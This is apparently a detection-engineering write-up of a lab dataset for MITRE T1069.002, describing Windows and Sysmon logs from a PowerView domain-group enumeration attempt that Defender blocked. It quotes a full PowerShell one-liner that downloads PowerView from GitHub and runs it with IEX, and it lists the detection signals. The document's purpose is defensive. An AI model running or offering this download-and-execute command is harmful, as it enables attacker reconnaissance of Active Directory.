# T1069.002-6: Domain Groups — PowerView

## Technique Context

T1069.002 (Domain Groups) involves adversaries enumerating domain groups, particularly privileged groups like Domain Admins, to understand the domain's administrative structure and identify high-value targets. PowerView is a popular PowerShell reconnaissance framework that provides extensive Active Directory enumeration capabilities, including the `Find-GPOComputerAdmin` function that queries Group Policy to identify which users and groups have local administrator rights on specific computers.

This technique is critical for lateral movement planning, as attackers need to understand who has administrative access to which systems to chart privilege escalation paths. The detection community focuses on identifying PowerShell execution with AD enumeration patterns, web requests to known PowerView repositories, and LDAP queries that retrieve GPO and administrative group information.

## What This Dataset Contains

This dataset captures a PowerView execution that was blocked by Windows Defender. The key evidence includes:

**Security Event 4688** shows the PowerShell command line that attempts to download and execute PowerView:
```
Process Command Line: "powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose}
```

**Security Event 4689** shows the PowerShell process (PID 0xa6b0) exited with status `0xC0000022` (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the execution.

**Sysmon Events** capture the PowerShell process initialization, including .NET CLR loading (EID 7) and named pipe creation for PowerShell remoting (EID 17). Notably, Sysmon EID 7 events show `urlmon.dll` loading, which would be used for the web request to download PowerView.

**PowerShell Operational logs** contain only test framework boilerplate (`Set-StrictMode`, `Set-ExecutionPolicy Bypass` via EID 4103/4104), with no actual PowerView script content logged since Defender blocked execution before the download completed.

## What This Dataset Does Not Contain

The dataset lacks the actual PowerView enumeration telemetry because Windows Defender successfully blocked the technique. You won't find:
- LDAP queries to enumerate GPOs or domain groups
- Network connections to the PowerShell Gallery or GitHub
- PowerShell script block logs of PowerView functions
- Discovery of local administrator mappings
- Any successful domain enumeration artifacts

The early termination means this dataset represents an *attempt* at domain group discovery rather than successful execution, which limits its utility for understanding the technique's full behavioral patterns.

## Assessment

This dataset provides moderate value for detection engineering, primarily documenting the initial execution vector and defense evasion attempt rather than the core discovery behavior. The complete command line in Security 4688 events is the strongest detection signal, showing the full attack chain from PowerView download to intended execution of `Find-GPOComputerAdmin`.

The dataset would be significantly stronger if it included successful execution, as that would capture the LDAP enumeration patterns, Active Directory queries, and network traffic that characterize this technique. However, it effectively demonstrates how endpoint protection can prevent technique completion while still generating valuable forensic evidence of the attempt.

## Detection Opportunities Present in This Data

1. **PowerView download patterns** - Security 4688 command lines containing URLs to PowerSploit/PowerView GitHub repositories
2. **Suspicious PowerShell one-liners** - Command lines combining `IEX (IWR...)` patterns with known reconnaissance functions like `Find-GPOComputerAdmin`
3. **Process termination with ACCESS_DENIED** - Security 4689 events showing PowerShell processes exiting with status 0xC0000022 after suspicious command execution
4. **PowerShell execution policy bypass** - PowerShell 4103 events showing `Set-ExecutionPolicy Bypass` combined with web download attempts
5. **URLMon.dll loading in PowerShell** - Sysmon EID 7 events showing network-related DLL loads that may indicate web request preparation
6. **PowerShell named pipe creation** - Sysmon EID 17 events showing PSHost pipe creation that could indicate PowerShell remoting preparation for lateral movement
